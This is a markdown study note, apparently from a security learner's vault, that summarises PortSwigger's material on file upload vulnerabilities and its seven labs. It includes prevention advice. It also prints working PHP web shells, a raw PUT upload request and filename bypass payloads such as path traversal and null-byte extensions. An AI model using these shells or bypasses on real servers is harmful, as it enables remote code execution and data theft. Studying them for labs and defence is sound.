---
tags: [hacking, web, portswigger, file-upload]
type: vulnerability-category
source: https://portswigger.net/web-security/file-upload
last-verified: 2026-08-25
---

# File upload vulnerabilities

## Up
- [[PortSwigger]]

## What it is
File upload vulnerabilities arise when a server lets users upload files without sufficiently validating name, type, contents, or size. The worst case is uploading a server-side script (a **web shell**) that executes, giving remote code execution; other impacts include overwriting files and denial of service.

## Web shells
A web shell is a script that runs arbitrary commands via HTTP requests. Minimal PHP examples:
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
<?php echo system($_GET['command']); ?>
```
Once uploaded to an executable location, request it (e.g. `/uploads/shell.php?command=id`) for full control.

## Flawed validation and bypasses

- **Content-Type trust** — the server believes the multipart `Content-Type` header instead of inspecting the file. Set `Content-Type: image/jpeg` on a `.php` upload.
- **Directory not preventing execution** — if the upload dir executes scripts, a plain `.php` upload runs. If uploads are served but not executed, chain with path traversal to place the file where it *will* execute (`filename=../shell.php`).
- **Extension blacklist bypass:**
  - Alternative executable extensions: `.php5`, `.phtml`, `.shtml`, `.phar`
  - Case variation: `exploit.pHp`
  - Trailing chars: `exploit.php.`, `exploit.php ` , `exploit.php%20`, `exploit.php.....`
  - Double extension: `exploit.php.jpg`
  - Null byte: `exploit.php%00.jpg`
  - URL-encoded dot: `exploit%2Ephp`
- **Overriding server config** — upload `.htaccess` (Apache) or `web.config` (IIS) to map a benign extension to the PHP handler, then upload `shell.xyz`.
- **Content/MIME (magic bytes) validation** — bypass by prepending valid file signatures (e.g. JPEG `FF D8 FF`) or by making a **polyglot** that's a valid image *and* runs code (embed PHP in metadata via ExifTool).
- **PUT method** — where enabled, upload directly:
  ```
  PUT /images/exploit.php HTTP/1.1
  Content-Type: application/x-httpd-php

  <?php system($_GET['c']); ?>
  ```
  Probe support with an `OPTIONS` request.
- **Race conditions** — a file that's validated *after* being written to a temp/public path can be requested during the window; predictable temp names (`uniqid()`) may be brute-forceable.

## Prevention
- Validate with an **allow-list** of extensions and check the actual content type.
- **Rename** uploaded files (random name) and strip/normalize the extension.
- Store uploads **outside the web root** or on a separate domain, served with a safe `Content-Type` and `Content-Disposition`.
- Ensure the upload directory can't execute scripts; don't trust the `Content-Type` header.
- Prefer a well-tested framework over hand-rolled validation.

## Labs
7 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Remote code execution via web shell upload | Apprentice | Upload a plain `.php` shell to an executable dir; request it. | |
| Web shell upload via Content-Type restriction bypass | Apprentice | Keep the `.php` file but set `Content-Type: image/jpeg`. | |
| Web shell upload via path traversal | Practitioner | Use `../` in the filename to place the shell where it executes. | |
| Web shell upload via extension blacklist bypass | Practitioner | Upload `.htaccess` mapping an extension, or use `.phtml`. | |
| Web shell upload via obfuscated file extension | Practitioner | Null byte / double extension, e.g. `shell.php%00.jpg`. | |
| Remote code execution via polyglot web shell upload | Practitioner | Embed PHP in image metadata (ExifTool) so it passes content checks. | |
| Web shell upload via race condition | Expert | Request the file during the validation window before it's removed. | |
